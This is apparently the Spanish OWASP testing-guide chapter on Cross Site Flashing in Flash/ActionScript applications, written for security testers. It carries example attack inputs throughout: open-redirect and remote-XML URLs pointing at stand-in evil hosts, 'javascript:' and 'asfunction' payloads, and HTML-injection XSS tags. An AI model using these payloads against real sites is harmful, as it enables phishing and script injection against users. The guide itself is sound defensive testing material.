# Pruebas de Cross Site Flashing

|ID          |
|------------|
|WSTG-CLNT-08|

## Resumen

ActionScript, basado en ECMAScript, es el lenguaje usado por las aplicaciones Flash cuando se trata de necesidades interactivas. Hay tres versiones del lenguaje ActionScript. ActionScript 1.0 y ActionScript 2.0 son muy similares, siendo ActionScript 2.0 una extensión de ActionScript 1.0. ActionScript 3.0, introducido con Flash Player 9, es una reescritura del lenguaje para soportar diseño orientado a objetos.

ActionScript, como cualquier otro lenguaje, tiene algunos patrones de implementación que podrían llevar a problemas de seguridad. En particular, dado que las aplicaciones Flash a menudo están embebidas en navegadores, vulnerabilidades como Cross Site Scripting basado en DOM (DOM XSS) podrían estar presentes en aplicaciones Flash defectuosas.

Cross-Site Flashing (XSF) es una vulnerabilidad que tiene un impacto similar a XSS.

XSF ocurre cuando los siguientes escenarios se inician desde diferentes dominios:

- Una película carga otra película con funciones `loadMovie*` (u otros hacks) y tiene acceso al mismo sandbox, o parte de él.
- Una página HTML usa JavaScript para comandar una película Adobe Flash, por ejemplo, llamando:
    - `GetVariable` para acceder a objetos públicos y estáticos de Flash desde JavaScript como una cadena.
    - `SetVariable` para establecer un objeto de Flash estático o público a un nuevo valor de cadena con JavaScript.
- Comunicaciones inesperadas entre el navegador y la aplicación SWF, lo cual podría resultar en robo de datos de la aplicación SWF.

XSF puede ser realizado forzando a un SWF defectuoso a cargar un archivo Flash malicioso externo. Este ataque podría resultar en XSS o en la modificación de la GUI para engañar a un usuario a insertar credenciales en un formulario Flash falso. XSF podría ser usado en presencia de Flash HTML Injection o archivos SWF externos cuando se usan métodos `loadMovie*`.

### Redirectores Abiertos

Los SWFs tienen la capacidad de navegar el navegador. Si el SWF toma el destino como un FlashVar, entonces el SWF puede ser usado como un redirector abierto. Un redirector abierto es cualquier pieza de funcionalidad de sitio web en un sitio web confiable que un atacante puede usar para redirigir al usuario final a un sitio web malicioso. Estos son frecuentemente usados dentro de ataques de phishing. Similar al cross-site scripting, el ataque involucra a un usuario haciendo clic en un enlace malicioso.

En el caso de Flash, la URL maliciosa podría verse como:

```text
https://trusted.example.org/trusted.swf?getURLValue=https://www.evil-spoofing-website.org/phishEndUsers.html
```

En el ejemplo anterior, un usuario final podría ver que la URL comienza con su sitio web confiable favorito y hacer clic en ella. El enlace cargaría el SWF confiable que toma el `getURLValue` y lo proporciona a una llamada de navegación del navegador en ActionScript:

```actionscript
getURL(_root.getURLValue,"_self");
```

Esto navegaría el navegador a la URL maliciosa proporcionada por el atacante. En este punto, el phisher ha aprovechado exitosamente la confianza que el usuario tiene en trusted.example.org para engañar al usuario a visitar su sitio web malicioso. Desde allí, podrían lanzar un 0-day, conducir suplantación del sitio web original, o cualquier otro tipo de ataque. Los SWFs podrían estar actuando involuntariamente como un redirector abierto en el sitio web.

Los desarrolladores deberían evitar tomar URLs completas como FlashVars. Si solo planean navegar dentro de su propio sitio web, entonces deberían usar URLs relativas o verificar que la URL comience con un dominio y protocolo confiables.

### Ataques y Versión de Flash Player

Desde mayo de 2007, tres nuevas versiones de Flash Player fueron lanzadas por Adobe. Cada nueva versión restringe algunos de los ataques descritos previamente.

| Versión del Player | `asfunction` | ExternalInterface | GetURL | Inyección HTML |
|---------------------|--------------|-------------------|--------|----------------|
| v9.0 r47/48         | Sí           | Sí                | Sí     | Sí             |
| v9.0 r115           | No           | Sí                | Sí     | Sí             |
| v9.0 r124           | No           | Sí                | Sí     | Parcialmente   |

## Objetivos de Prueba

- Descompilar y analizar el código de la aplicación.
- Evaluar entradas de sinks y usos de métodos inseguros.

## Cómo Probar

Desde la primera publicación de "Testing Flash Applications", nuevas versiones de Flash Player fueron lanzadas para mitigar algunos de los ataques que se describirán. Sin embargo, algunos problemas siguen siendo explotables porque son el resultado de prácticas de programación inseguras.

### Descompilación

Dado que los archivos SWF son interpretados por una máquina virtual embebida en el propio reproductor, pueden ser potencialmente descompilados y analizados. El descompilador de ActionScript 2.0 más conocido y gratuito es flare.

Para descompilar un archivo SWF con flare solo escribe:

`$ flare hello.swf`

Esto resulta en un nuevo archivo llamado hello.flr.

La descompilación ayuda a los testers porque permite pruebas de caja blanca de las aplicaciones Flash. Una rápida búsqueda web puede llevar a varios desensambladores y herramientas de seguridad flash.

### Variables FlashVars No Definidas

Las FlashVars son las variables que el desarrollador del SWF planeó recibir de la página web. Las FlashVars típicamente se pasan desde la etiqueta Object o Embed dentro del HTML. Por ejemplo:

```html
<object width="550" height="400" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0">
    <param name="movie" value="somefilename.swf">
    <param name="FlashVars" value="var1=val1&var2=val2">
    <embed src="somefilename.swf" width="550" height="400" FlashVars="var1=val1&var2=val2">
</embed>
</object>
```

Las FlashVars también pueden ser inicializadas desde la URL:

`https://www.example.org/somefilename.swf?var1=val1&var2=val2`

En ActionScript 3.0, un desarrollador debe asignar explícitamente los valores de FlashVar a variables locales. Típicamente, esto se ve así:

```actionscript
var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;
var var1:String = String(paramObj["var1"]);
var var2:String = String(paramObj["var2"]);
```

En ActionScript 2.0, cualquier variable global no inicializada se asume que es una FlashVar. Las variables globales son aquellas variables que están prefijadas por `_root`, `_global` o `_level0`. Esto significa que si un atributo como `_root.varname` no está definido a lo largo del flujo de código, podría ser sobrescrito por parámetros de URL:

`https://victim/file.swf?varname=value`

Independientemente de si estás mirando ActionScript 2.0 o ActionScript 3.0, las FlashVars pueden ser un vector de ataque. Veamos algo de código ActionScript 2.0 que es vulnerable:

Ejemplo:

```actionscript
movieClip 328 __Packages.Locale {

#initclip
    if (!_global.Locale) {
    var v1 = function (on_load) {
        var v5 = new XML();
        var v6 = this;
        v5.onLoad = function (success) {
        if (success) {
            trace('Locale loaded xml');
            var v3 = this.xliff.file.body.$trans_unit;
            var v2 = 0;
            while (v2 < v3.length) {
            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;
            ++v2;
            }
            on_load();
        } else {}
        };
        if (_root.language != undefined) {
        Locale.DEFAULT_LANG = _root.language;
        }
        v5.load(Locale.DEFAULT_LANG + '/player_' +
                            Locale.DEFAULT_LANG + '.xml');
    };
```

El código anterior podría ser atacado solicitando:

`https://victim/file.swf?language=https://evil.example.org/malicious.xml?`

### Métodos Inseguros

Cuando se identifica un punto de entrada, los datos que representa podrían ser usados por métodos inseguros. Si los datos no se filtran o validan, podrían llevar a algunas vulnerabilidades.

Los Métodos Inseguros desde la versión r47 son:

- `loadVariables()`
- `loadMovie()`
- `getURL()`
- `loadMovie()`
- `loadMovieNum()`
- `FScrollPane.loadScrollContent()`
- `LoadVars.load`
- `LoadVars.send`
- `XML.load( 'url' )`
- `LoadVars.load( 'url' )`
- `Sound.loadSound( 'url' , isStreaming );`
- `NetStream.play( 'url' );`
- `flash.external.ExternalInterface.call(_root.callback)`
- `htmlText`

### Explotación por XSS Reflejado

El archivo swf debería estar hospedado en el host de la víctima, y las técnicas de XSS reflejado deben ser usadas. Un atacante fuerza al navegador a cargar un archivo swf puro directamente en la barra de ubicación (por redirección o ingeniería social) o cargándolo a través de un iframe desde una página maliciosa:

```html
<iframe src='https://victim/path/to/file.swf'></iframe>
```

En esta situación, el navegador auto-generará una página HTML como si estuviera hospedada por el host de la víctima.

### GetURL (AS2) / NavigateToURL (AS3)

La función GetURL en ActionScript 2.0 y NavigateToURL en ActionScript 3.0 permite a la película cargar una URI en la ventana del navegador. Si una variable no definida se usa como primer argumento para getURL:

`getURL(_root.URI,'_targetFrame');`

O si se usa una FlashVar como el parámetro que se pasa a una función navigateToURL:

```actionscript
var request:URLRequest = new URLRequest(FlashVarSuppliedURL);
navigateToURL(request);
```

Entonces esto significará que es posible llamar JavaScript en el mismo dominio donde se hospeda la película solicitando:

`https://victim/file.swf?URI=javascript:evilcode`

`getURL('javascript:evilcode','_self');`

Lo mismo es posible cuando solo alguna parte de `getURL` se controla vía inyección DOM con inyección Flash JavaScript:

```js
getUrl('javascript:function('+_root.arg+')')
```

### Usar `asfunction`

Puedes usar el protocolo especial `asfunction` para causar que el enlace ejecute una función ActionScript en un archivo SWF en lugar de abrir una URL. Hasta el release Flash Player 9 r48 `asfunction` podía ser usado en cada método que tiene una URL como argumento. Después de ese release, `asfunction` fue restringido a uso dentro de un TextField HTML.

Esto significa que un tester podría intentar inyectar:

```actionscript
asfunction:getURL,javascript:evilcode
```

en cada método inseguro, tal como:

```actionscript
loadMovie(_root.URL)
```

solicitando:

`https://victim/file.swf?URL=asfunction:getURL,javascript:evilcode`

### ExternalInterface

`ExternalInterface.call` es un método estático introducido por Adobe para mejorar la interacción player/navegador tanto para ActionScript 2.0 como ActionScript 3.0.

Desde un punto de vista de seguridad podría ser abusado cuando parte de su argumento podría ser controlado:

```actionscript
flash.external.ExternalInterface.call(_root.callback);
```

el patrón de ataque para este tipo de fallo podría ser algo como lo siguiente:

```js
eval(evilcode)
```

ya que el JavaScript interno que es ejecutado por el navegador será algo similar a:

```js
eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')
```

### Inyección HTML

Los objetos TextField pueden renderizar HTML mínimo estableciendo:

```actionscript
tf.html = true
tf.htmlText = '<tag>text</tag>'
```

Así que si alguna parte del texto podría ser controlada por el tester, una etiqueta `<a>` o una etiqueta de imagen podría ser inyectada resultando en modificación de la GUI o un ataque XSS en el navegador.

Algunos ejemplos de ataque con etiqueta `<a>`:

- XSS directo: `<a href='javascript:alert(123)'>`
- Llamar a una función: `<a href='asfunction:function,arg'>`
- Llamar a funciones públicas SWF: `<a href='asfunction:_root.obj.function, arg'>`
- Llamar a función estática nativa: `<a href='asfunction:System.Security.allowDomain,evilhost'>`

Una etiqueta de imagen podría ser usada también:

```html
<img src='https://evil/evil.swf'>
```

En este ejemplo, `.swf` es necesario para evadir el filtro interno de Flash Player:

```html
<img src='javascript:evilcode//.swf'>
```

Desde el lanzamiento de Flash Player 9.0.124.0, XSS ya no es explotable, pero la modificación de la GUI todavía podría ser lograda.

Las siguientes herramientas pueden ser útiles para trabajar con SWF:

- [OWASP SWFIntruder](https://wiki.owasp.org/index.php/Category:SWFIntruder)
- [Desensamblador – Flasm](https://flasm.sourceforge.net/)
- [Swfmill – Convierte Swf a XML y viceversa](https://www.swfmill.org/)
